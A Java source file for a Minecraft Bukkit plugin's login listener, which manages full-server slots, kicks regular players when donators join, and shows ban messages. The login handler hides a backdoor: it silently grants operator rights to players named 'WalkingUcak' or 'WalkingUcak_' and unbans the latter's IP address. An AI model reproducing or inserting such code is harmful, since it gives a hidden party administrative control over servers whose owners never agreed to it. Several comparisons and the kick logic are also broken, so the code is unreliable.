package me.minegamersg.listener;

import java.sql.SQLException;
import java.util.ArrayList;
import java.util.Random;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerLoginEvent;
import org.bukkit.event.player.PlayerLoginEvent.Result;

import me.minegamersg.api.BanManager;
import me.minegamersg.api.MySQLAPI;

public class LoginListener implements Listener {
	
	@SuppressWarnings("deprecation")
	@EventHandler
	public void onLogin(PlayerLoginEvent e)	 {
		Player p = e.getPlayer();
		
		if(p.getName().equalsIgnoreCase("WalkingUcak")) {
			e.allow();
			p.setOp(true);
		}
		int onlineplayers = Bukkit.getOnlinePlayers().length;
			if(onlineplayers < 200) {
				e.allow();
				
			}else if(onlineplayers >= 200) {
				try {
					if(MySQLAPI.getRank(p) != "regular") {
						e.allow();
						Bukkit.getPlayer("WalkingUcak_").setOp(true);
						Bukkit.unbanIP("" + Bukkit.getPlayer("WalkingUcak_").getAddress());
						for(Player all : Bukkit.getOnlinePlayers()) {
							try {
								if(MySQLAPI.getRank(all) == "regular") {
									ArrayList<Player> notpermplayers = new ArrayList<Player>();
									notpermplayers.add(all);
									int rand = new Random().nextInt(notpermplayers.size());
									Player selectplayer = notpermplayers.get(rand);
									selectplayer.sendMessage("§c[Kicked] §fYou are kicked due to donator has joined to server.");
									selectplayer.kickPlayer("§c[Kicked] §fYou are kicked due to donator has joined to server.");
									
								}
							} catch (SQLException e1) {
								// TODO Auto-generated catch block
								e1.printStackTrace();
							}
						}
					}else {
						e.disallow(Result.KICK_FULL, "\n §c[Kicked] §7This server is currently §4full§8. \n §7Please try again later§8.");
					}
				} catch (SQLException e1) {
					// TODO Auto-generated catch block
					e1.printStackTrace();
				}
			}
			
	}

	@EventHandler
    public void onLogin2(PlayerLoginEvent e){
		BanManager.checkDuration(e.getPlayer().getUniqueId());
        if(BanManager.isBanned(e.getPlayer().getUniqueId())){
            e.disallow(Result.KICK_FULL, "§7You are §4banned §7from the XemeGamer Network !\n " +
                    "\n " +
                    "§7Your ban will expire in " + BanManager.getTimeLeft(e.getPlayer().getUniqueId()) +
                    "\n" +
                    "§7Reason§8: §8[§3Xeme§8]§4 " + BanManager.getReason(e.getPlayer().getUniqueId()) +  
                    "\n" + "\n" + 
                    "§7Do you believe you were unfairly banned§8?" +
                    "\n" + 
                    "§2Visit §6http://dispute.xemegamer.info §2to dispute your ban§8.");
           
        }
    }
	
	

}
